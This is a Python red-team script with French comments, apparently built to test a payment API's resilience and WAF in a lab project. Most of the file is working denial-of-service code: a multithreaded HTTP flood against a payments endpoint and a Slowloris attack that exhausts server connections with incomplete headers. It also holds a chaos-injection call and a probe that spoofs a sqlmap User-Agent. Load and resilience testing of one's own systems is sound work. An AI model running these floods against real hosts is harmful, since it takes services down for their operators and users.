#!/usr/bin/env python3
"""
PROJECT RESILIENCE-ALPHA — Red Team Attack Generator
Ce script est conçu pour être exécuté depuis le PC Attaquant externe
(connecté via le point d'accès Wi-Fi RESILIENCE-G<n> ou sur le réseau local).

Attaques supportées :
  1. HTTP Flood (saturation de requêtes concurrentes)
  2. Slowloris (épuisement de connexions HTTP keep-alive)
  3. Injection d'erreurs applicatives & latence (Chaos API)
  4. Test de sonde Scanner WAF (vérification du blocage OWASP 403 Forbidden)
"""

import sys
import time
import socket
import random
import argparse
import threading
import httpx

BANNER = """
==============================================================
  PROJECT RESILIENCE-ALPHA — RED TEAM ATTACK CONSOLE
  Objectif : Dégrader le service pour déclencher l'AIOps & la remédiation
==============================================================
"""

class RedTeamAttacker:
    def __init__(self, target_host: str, target_port: int):
        self.target_host = target_host
        self.target_port = target_port
        self.base_url = f"http://{target_host}:{target_port}"
        self.running = False
        self.stats = {"sent": 0, "errors": 0, "success": 0}

    def print_status(self):
        while self.running:
            time.sleep(2)
            print(f"[RED TEAM] Requêtes envoyées: {self.stats['sent']} | Succès (201): {self.stats['success']} | Bloquées/Échecs: {self.stats['errors']}")

    def attack_http_flood(self, duration_sec: int = 30, concurrency: int = 15):
        """Attaque HTTP Flood volumétrique vers l'API de paiement."""
        print(f"\n[+] Lancement HTTP Flood vers {self.base_url} ({duration_sec}s, {concurrency} threads)...")
        print(f"[i] Si ciblé sur le port 3000 (WAF), le rate limiting de 5 req/s (burst 10) renverra du HTTP 429.")
        self.running = True
        self.stats = {"sent": 0, "errors": 0, "success": 0}
        
        status_thread = threading.Thread(target=self.print_status, daemon=True)
        status_thread.start()

        def worker():
            client = httpx.Client(timeout=3.0)
            while self.running:
                try:
                    payload = {
                        "amount": round(random.uniform(1.0, 50.0), 2),
                        "currency": "EUR",
                        "customer_name": f"ATTACKER-BOT-{random.randint(100, 999)}",
                        "customer_email": "bot@botnet.local",
                        "card_number": "4532000000009999",
                        "card_expiry": "12/28",
                        "card_cvv": "000",
                        "merchant_id": "TARGET-MERCHANT",
                    }
                    res = client.post(f"{self.base_url}/api/v1/payments", json=payload)
                    self.stats["sent"] += 1
                    if res.status_code == 201:
                        self.stats["success"] += 1
                    else:
                        self.stats["errors"] += 1
                except Exception:
                    self.stats["sent"] += 1
                    self.stats["errors"] += 1

        threads = [threading.Thread(target=worker, daemon=True) for _ in range(concurrency)]
        for t in threads:
            t.start()

        time.sleep(duration_sec)
        self.running = False
        print(f"\n[OK] Fin du HTTP Flood. Total: {self.stats['sent']} requêtes (Succès: {self.stats['success']}, Bloquées/Erreurs: {self.stats['errors']}).")

    def attack_slowloris(self, sockets_count: int = 80, duration_sec: int = 30):
        """Attaque Slowloris : ouverture de connexions partielles pour saturer le serveur."""
        print(f"\n[+] Lancement Slowloris vers {self.target_host}:{self.target_port} ({sockets_count} sockets, {duration_sec}s)...")
        self.running = True
        sockets_list = []

        headers = [
            f"GET /api/v1/payments HTTP/1.1\r\n",
            f"Host: {self.target_host}\r\n",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) ResilienceRedTeam/1.0\r\n",
            "Accept-language: en-US,en,q=0.5\r\n",
        ]

        for i in range(sockets_count):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((self.target_host, self.target_port))
                for header in headers:
                    s.send(header.encode("utf-8"))
                sockets_list.append(s)
            except socket.error:
                break

        print(f"[+] {len(sockets_list)} sockets connectés. Envoi de keep-alive incomplets...")
        start_time = time.time()
        while time.time() - start_time < duration_sec:
            for s in list(sockets_list):
                try:
                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
                except socket.error:
                    sockets_list.remove(s)
            time.sleep(5)

        for s in sockets_list:
            try:
                s.close()
            except Exception:
                pass
        print(f"\n[OK] Fin de l'attaque Slowloris.")

    def trigger_chaos_attack(self, latency_ms: int = 1500, error_rate: float = 0.7):
        """Injecte un état d'anomalie critique directement via les routes chaos de l'API."""
        print(f"\n[+] Injection d'anomalie via Chaos API (Latence: {latency_ms}ms, Erreurs: {int(error_rate*100)}%)...")
        try:
            res = httpx.post(
                f"{self.base_url}/api/v1/chaos/configure",
                json={"injected_latency_ms": latency_ms, "injected_error_rate": error_rate},
                timeout=5.0,
            )
            if res.status_code == 200:
                print("[OK] Chaos injecté avec succès ! Le modèle ML AIOps doit maintenant détecter l'anomalie.")
            else:
                print(f"[!] Erreur de configuration chaos : HTTP {res.status_code}")
        except Exception as e:
            print(f"[!] Échec de connexion : {e}")

    def test_scanner_detection(self):
        """Test de détection WAF par signature d'outils d'attaque (ex: Sqlmap / Nikto)."""
        print(f"\n[+] Test de détection de scanner malveillant vers {self.base_url}...")
        client = httpx.Client(timeout=4.0, headers={"User-Agent": "sqlmap/1.7.2#stable"})
        try:
            res = client.get(f"{self.base_url}/api/v1/payments")
            print(f"[*] Code HTTP retourné : {res.status_code}")
            if res.status_code == 403:
                print("[OK] SUCCÈS DÉFENSE : Le WAF a intercepté et bloqué le scanner suspect (HTTP 403 Forbidden) !")
                print(f"    Réponse WAF : {res.text.strip()}")
            else:
                print(f"[!] ATTENTION : Le scanner n'a pas été bloqué (Code HTTP {res.status_code}). Vérifiez la configuration Nginx.")
        except Exception as e:
            print(f"[!] Échec de connexion : {e}")


def main():
    print(BANNER)
    parser = argparse.ArgumentParser(description="Projet Resilience-Alpha - Script Red Team")
    parser.add_argument("--host", "--target", dest="host", default="localhost",
                        help="IP ou nom d'hôte de la cible (ex: 192.168.1.50)")
    parser.add_argument("--port", type=int, default=3000,
                        help="Port cible (3000 pour le WAF Nginx / Dashboard, 8000 pour le bypass direct)")
    parser.add_argument("--mode", "--attack", dest="mode",
                        choices=["flood", "slowloris", "chaos", "scanner", "demo"], default="demo",
                        help="Type d'attaque : flood, slowloris, chaos, scanner, demo")
    parser.add_argument("--duration", type=int, default=25,
                        help="Durée de l'attaque en secondes")
    parser.add_argument("--threads", "--concurrency", dest="threads", type=int, default=15,
                        help="Nombre de threads concurrents pour le flood")

    args = parser.parse_args()
    attacker = RedTeamAttacker(args.host, args.port)

    if args.mode == "flood":
        attacker.attack_http_flood(duration_sec=args.duration, concurrency=args.threads)
    elif args.mode == "slowloris":
        attacker.attack_slowloris(duration_sec=args.duration)
    elif args.mode == "chaos":
        attacker.trigger_chaos_attack()
    elif args.mode == "scanner":
        attacker.test_scanner_detection()
    elif args.mode == "demo":
        print("[DEMO SCENARIO] 1. Test du WAF avec scanner suspect")
        attacker.test_scanner_detection()
        print("\n[DEMO SCENARIO] 2. Injection d'une perturbation forte (Chaos)")
        attacker.trigger_chaos_attack(latency_ms=1200, error_rate=0.65)
        print("\n[DEMO SCENARIO] 3. Envoi d'une rafale de requêtes pour saturer l'observabilité")
        attacker.attack_http_flood(duration_sec=15, concurrency=args.threads)
        print("\n[+] Attaque terminée. Regardez la console de Remédiation pour constater le Zero-Touch Recovery !")

if __name__ == "__main__":
    main()
